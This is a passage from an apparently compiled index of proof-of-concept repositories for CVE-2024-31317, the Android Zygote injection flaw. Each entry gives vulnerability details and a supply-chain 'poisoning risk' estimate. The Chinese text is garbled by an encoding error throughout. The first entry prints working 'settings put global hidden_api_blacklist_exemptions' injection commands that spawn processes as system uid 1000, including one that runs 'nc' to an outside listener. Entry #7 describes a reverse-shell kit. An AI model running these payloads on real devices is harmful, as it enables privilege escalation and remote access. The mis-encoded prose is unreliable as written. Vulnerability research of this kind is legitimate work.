**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ `WRITE_SECURE_SETTINGS` æƒé™ã€‚é€šå¸¸å¯é€šè¿‡ ADB æˆ–å…¶ä»–æ¼æ´è·å–ã€‚ä½ç‰ˆæœ¬Androidå¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ³¨å…¥ï¼Œé«˜ç‰ˆæœ¬éœ€è¦Bypassæ–¹æ¡ˆã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317 å…è®¸æ”»å‡»è€…åˆ©ç”¨ä¸å®‰å…¨çš„ååºåˆ—åŒ–æˆ–å‘½ä»¤æ³¨å…¥ï¼Œåœ¨ Zygote è¿›ç¨‹ä¸­ä»¥ä»»æ„åº”ç”¨èº«ä»½æ‰§è¡Œä»£ç ã€‚è¯¥æ¼æ´å­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™è®¾ç½®æ¶æ„çš„ `hidden_api_blacklist_exemptions` å€¼ï¼Œä»è€Œæ³¨å…¥æ¶æ„å‚æ•°ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– `WRITE_SECURE_SETTINGS` æƒé™ï¼š** è¿™æ˜¯åˆ©ç”¨è¯¥æ¼æ´çš„å‰ææ¡ä»¶ã€‚å¯ä»¥é€šè¿‡ ADB (å¦‚æœè®¾å¤‡å·²å¯ç”¨ USB è°ƒè¯•) æˆ–åˆ©ç”¨å…¶ä»–æ¼æ´æ¥è·å–æ­¤æƒé™ã€‚
2.  **æ„é€ æ¶æ„ `hidden_api_blacklist_exemptions` å€¼ï¼š** æ”»å‡»è€…éœ€è¦æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ `settings put global hidden_api_blacklist_exemptions` å‘½ä»¤å°†å…¶å†™å…¥ç³»ç»Ÿè®¾ç½®ã€‚
3.  **è§¦å‘ Zygote è¿›ç¨‹ï¼š**  å†™å…¥è®¾ç½®åï¼Œå½“ç³»ç»Ÿå°è¯•ä½¿ç”¨è¢«ç¯¡æ”¹çš„ `hidden_api_blacklist_exemptions` æ—¶ï¼ŒZygote è¿›ç¨‹ä¼šæ‰§è¡Œæ³¨å…¥çš„æ¶æ„å‘½ä»¤ã€‚

**ä½ç‰ˆæœ¬ (Android 11 åŠä»¥ä¸‹) åˆ©ç”¨ï¼š**
å¯ä»¥ç›´æ¥é€šè¿‡æ¢è¡Œç¬¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n8\n--runtime-args\n--setuid=1000\n--setgid=1000\n--nice-name=com.android.settings\n--app-data-dir=/data/user/0/com.android.settings\n--package-name=com.android.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\nandroid.app.ActivityThread"
```
å¯ä»¥ä½¿ç”¨`invoke-with`å‚æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä½†éœ€è¦å¼€å¯ debug æ¨¡å¼ï¼Œå¯ä»¥é€šè¿‡`runtime-flags`å‚æ•°è®¾ç½®æ‰€æœ‰debugå±æ€§ã€‚
```
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(\n7\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=43267\n--invoke-with\nnc 192.168.0.112 9981;\n--seinfo=platform:system_app:targetSdkVersion=29:complete"
```

**é«˜ç‰ˆæœ¬ (Android 12 åŠä»¥ä¸Š) åˆ©ç”¨ï¼š**
ç”±äº Google åœ¨ Android 12 ä¸­å¼•å…¥äº† C++ å‘½ä»¤è§£æå™¨ï¼Œç®€å•çš„å‘½ä»¤æ³¨å…¥ä¸å†æœ‰æ•ˆã€‚éœ€è¦ä½¿ç”¨æ›´å¤æ‚çš„ç»•è¿‡æ–¹æ³•ï¼Œä¾‹å¦‚ï¼Œåœ¨æ³¨å…¥çš„æ¶æ„å‘½ä»¤ä¹‹å‰å¡«å……å¤§é‡é€—å·ä»¥å¢åŠ æ—¶é—´é—´éš”ï¼Œä»è€Œç»•è¿‡ `NativeCommandBuffer` çš„é™åˆ¶ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’Œåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ PoC ä»£ç åº”è¯¥æ˜¯æœ‰æ•ˆçš„ã€‚å¤šä¸ªæœç´¢å¼•æ“ç»“æœéƒ½æåˆ°äº†è¯¥æ¼æ´çš„åˆ©ç”¨ï¼Œå¹¶æä¾›äº†ç›¸å…³çš„åˆ†æå’Œå‚è€ƒé“¾æ¥ã€‚æä¾›çš„åˆ©ç”¨ä»£ç ä¹ŸåŒ…å«äº†ä½ç‰ˆæœ¬å’Œé«˜ç‰ˆæœ¬çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¹¶ç»™å‡ºäº†è¯¦ç»†çš„æ­¥éª¤å’Œç¤ºä¾‹ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è¯¥ä»“åº“ä¸»è¦åŒ…å«æ¼æ´åˆ©ç”¨çš„è¯´æ˜æ–‡æ¡£å’Œä¸€äº›æ„å»ºæ–‡ä»¶ã€‚è™½ç„¶æ— æ³•å®Œå…¨æ’é™¤æŠ•æ¯’çš„å¯èƒ½æ€§ï¼Œä½†ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œé£é™©è¾ƒä½ã€‚é£é™©ç‚¹å¯èƒ½å­˜åœ¨äºåˆ©ç”¨è„šæœ¬ä¸­ï¼Œä¾‹å¦‚æ‰§è¡Œ nc å‘½ä»¤ï¼Œè™½ç„¶æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç»œå·¥å…·ï¼Œä½†æ˜¯å­˜åœ¨è¢«åˆ©ç”¨çš„é£é™©ï¼Œä¾‹å¦‚è¿æ¥åˆ°æ¶æ„çš„æœåŠ¡å™¨ã€‚gradleæ–‡ä»¶é£é™©è¾ƒå°ï¼Œä¸»è¦æ˜¯æ„å»ºé…ç½®ï¼Œä½†ç†è®ºä¸Šå­˜åœ¨è¿œç¨‹ä¾èµ–å¼•å…¥æ¶æ„ä»£ç çš„å¯èƒ½æ€§ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [fuhei/CVE-2024-31317](https://github.com/fuhei/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #6

**æ¥æº**: [CVE-2024-31317-jmywh1_CVE-2024-31317.md](../2024/CVE-2024-31317-jmywh1_CVE-2024-31317.md)

## CVE-2024-31317-Android-Zygoteååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„åº”ç”¨ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦`android.permission.WRITE_SECURE_SETTINGS`æƒé™ï¼Œç”¨æˆ·äº¤äº’ä¸æ˜¯å¿…é¡»çš„

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2024-31317æ˜¯ä¸€ä¸ªAndroidç³»ç»Ÿä¸­çš„ç‰¹æƒæå‡æ¼æ´ï¼Œå­˜åœ¨äºZygoteProcess.javaçš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ‹¥æœ‰`WRITE_SECURE_SETTINGS`æƒé™çš„åº”ç”¨ç¨‹åºï¼Œä»¥ä»»ä½•åº”ç”¨ç¨‹åºçš„èº«ä»½æ‰§è¡Œä»£ç ï¼Œå¯¼è‡´æœ¬åœ°ææƒã€‚æ ¹æ®NVDçš„æè¿°ï¼Œè¯¥æ¼æ´çš„CVSS 3.1è¯„åˆ†ä¸º7.8ï¼Œå±äºé«˜å±æ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…åˆ©ç”¨`WRITE_SECURE_SETTINGS`æƒé™ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œä¼ é€’ç»™Zygoteè¿›ç¨‹å¤„ç†ã€‚Zygoteè¿›ç¨‹åœ¨ååºåˆ—åŒ–è¿™äº›æ•°æ®æ—¶ï¼Œç”±äºç¼ºä¹è¶³å¤Ÿçš„å®‰å…¨æ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæå‡æƒé™åˆ°å…¶ä»–åº”ç”¨ã€‚

**POCä»£ç åˆ†æï¼š**
æä¾›çš„POCä»£ç åŒ…å«`build.gradle`ã€`gradle.properties`å’Œ`gradlew`æ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„Android Gradleé¡¹ç›®çš„åŸºæœ¬æ–‡ä»¶ã€‚å®ƒä»¬ä¸»è¦ç”¨äºæ„å»ºAndroidåº”ç”¨ç¨‹åºï¼Œæœ¬èº«ä¸åŒ…å«ç›´æ¥åˆ©ç”¨CVE-2024-31317æ¼æ´çš„ä»£ç ã€‚è¿™ä¸ªåº“æœ¬èº«åªæ˜¯å®‰å“é¡¹ç›®gradleæ„å»ºæ–‡ä»¶ï¼Œè¦åˆ©ç”¨æ¼æ´è¿˜éœ€è¦æ›´å¤šä¿¡æ¯ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**
è™½ç„¶æä¾›çš„ä»£ç ç‰‡æ®µæœ¬èº«ä¸ç›´æ¥æ„æˆæ¼æ´åˆ©ç”¨ï¼Œä½†ä½œä¸ºä¸€ä¸ªAndroidé¡¹ç›®ï¼Œå®ƒå¯ä»¥è¢«ç”¨æ¥æ„å»ºåŒ…å«æ¼æ´åˆ©ç”¨ä»£ç çš„æ¶æ„åº”ç”¨ã€‚`gradlew`è„šæœ¬å¯èƒ½è¢«ä¿®æ”¹ä¸ºåŒ…å«ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„ä»£ç çš„æ­¥éª¤ï¼Œæˆ–è€…`build.gradle`æ–‡ä»¶å¯èƒ½è¢«ä¿®æ”¹ä¸ºå¼•å…¥åŒ…å«æ¶æ„ä»£ç çš„ä¾èµ–é¡¹ã€‚è€ƒè™‘åˆ°è¿™ç§å¯èƒ½æ€§ï¼ŒæŠ•æ¯’é£é™©ä¼°è®¡ä¸º10%ã€‚è¿™ä¸ªæ¦‚ç‡ä¸»è¦æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨æ„å»ºè¿‡ç¨‹ä¸­æ·»åŠ æ¶æ„ä¾èµ–æˆ–è€…æ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œä½†æ˜¯ä»ç›®å‰çš„ä»£ç æ¥çœ‹ï¼Œå¹¶æ²¡æœ‰ç›´æ¥çš„è¯æ®è¡¨æ˜å­˜åœ¨æ¶æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [jmywh1/CVE-2024-31317](https://github.com/jmywh1/CVE-2024-31317)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

## POC #7

**æ¥æº**: [CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md](../2024/CVE-2024-31317-mianliupindao_CVE-2024-31317-PoC-Deployer.md)

## CVE-2024-31317 Android ZygoteProcess ååºåˆ—åŒ–æ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-31317

**æ¼æ´ç±»å‹:** ååºåˆ—åŒ–æ¼æ´å¯¼è‡´ææƒ

**å½±å“åº”ç”¨:** Android

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœ¬åœ°ææƒåˆ°ä»»æ„åº”ç”¨æƒé™

**å½±å“ç‰ˆæœ¬:** Android 12, 12L, 13, 14

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦Useræ‰§è¡Œæƒé™ï¼Œæ— éœ€ç”¨æˆ·äº¤äº’ï¼Œéœ€è¦WRITE_SECURE_SETTINGSæƒé™ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 70%

## è¯¦æƒ…

CVE-2024-31317 æ˜¯ä¸€ä¸ª Android æ“ä½œç³»ç»Ÿä¸­çš„æƒé™æå‡æ¼æ´ï¼Œå­˜åœ¨äº `ZygoteProcess.java` çš„å¤šä¸ªå‡½æ•°ä¸­ã€‚ç”±äºä¸å®‰å…¨çš„ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ `WRITE_SECURE_SETTINGS` æƒé™æ‰§è¡Œä»»æ„åº”ç”¨ç¨‹åºçš„ä»£ç ã€‚è¿™å¯èƒ½å¯¼è‡´æœ¬åœ°æƒé™æå‡ã€‚ä»æœç´¢å¼•æ“ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´è¢«è®¤ä¸ºæ˜¯è¿‘å¹´æ¥æœ€æœ‰ä»·å€¼çš„Androidç”¨æˆ·ç©ºé—´æ¼æ´ä¹‹ä¸€ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„åˆ©ç”¨æ–¹æ³•ã€‚æ¼æ´åˆ©ç”¨ä»£ç  `Android_Zygote_Research_Kit.sh` è„šæœ¬æ—¨åœ¨å¸®åŠ©ç ”ç©¶äººå‘˜å¤ç°å’Œåˆ†ææ­¤æ¼æ´ã€‚å®ƒåŒ…å«ä¸€ä¸ªåå‘ shell ç¨‹åºï¼ˆ`reverse_shell.c`ï¼‰ï¼Œä¸€ä¸ª payload æ–‡ä»¶ï¼ˆ`payload.txt`ï¼‰ï¼Œä¸€ä¸ªç¼–è¯‘è„šæœ¬ï¼ˆ`compile.sh`ï¼‰ï¼Œä»¥åŠç›¸å…³çš„è¯´æ˜æ–‡æ¡£ã€‚è„šæœ¬å°è¯•åˆ›å»ºä¸€ä¸ªç›‘å¬ç‰¹å®šç«¯å£çš„åå‘ shellï¼Œè¿™æœ¬èº«å°±å­˜åœ¨ä¸€å®šçš„é£é™©ã€‚è„šæœ¬ä¸­åå‘è¿æ¥çš„ç¡¬ç¼–ç ç«¯å£å’ŒIPåœ°å€ï¼Œæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶å—å®³è®¾å¤‡çš„åå‘è¿æ¥ã€‚è€ƒè™‘åˆ°è„šæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿ç ”ç©¶äººå‘˜ä½¿ç”¨ï¼Œå­˜åœ¨ä¸€ç§æŠ•æ¯’é£é™©ï¼Œæ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹åå‘ shell çš„ä»£ç ï¼Œåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ¤å…¥æ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä¿®æ”¹ `reverse_shell.c` ä½¿å…¶åœ¨å»ºç«‹è¿æ¥åæ‰§è¡ŒæŸäº›æ¶æ„æ“ä½œï¼Œæˆ–è€…å°†æ”¶é›†åˆ°çš„ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ç”±äºè¿™ä¸ªæ¼æ´å…è®¸æ‰§è¡Œä»»æ„åº”ç”¨çš„ä»£ç ï¼Œå¦‚æœè¢«æ¶æ„åˆ©ç”¨ï¼Œå¯ä»¥é€ æˆå¾ˆå¤§çš„å±å®³ã€‚

åˆ©ç”¨æ–¹å¼ï¼š

1.  **æƒé™è·å–:** æ”»å‡»è€…éœ€è¦å…ˆè·å¾— `WRITE_SECURE_SETTINGS` æƒé™ã€‚
2.  **æ„é€ æ¶æ„æ•°æ®:**  æ„é€ åŒ…å«æ¶æ„ä»£ç çš„ååºåˆ—åŒ–æ•°æ®ã€‚
3.  **åˆ©ç”¨ ZygoteProcess:**  å°†æ¶æ„æ•°æ®ä¼ é€’ç»™å­˜åœ¨æ¼æ´çš„ `ZygoteProcess.java` å‡½æ•°ã€‚
4.  **ä»£ç æ‰§è¡Œ:**  åˆ©ç”¨ Zygote è¿›ç¨‹çš„æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œå®ç°æƒé™æå‡ã€‚

è¯¥`Android_Zygote_Research_Kit.sh`è„šæœ¬åªæ˜¯ä¸€ä¸ªè¾…åŠ©åˆ©ç”¨å·¥å…·ï¼Œç”¨äºç”Ÿæˆæ‰€éœ€çš„æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [mianliupindao/CVE-2024-31317-PoC-Deployer](https://github.com/mianliupindao/CVE-2024-31317-PoC-Deployer)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-31317](https://nvd.nist.gov/vuln/detail/CVE-2024-31317)

---

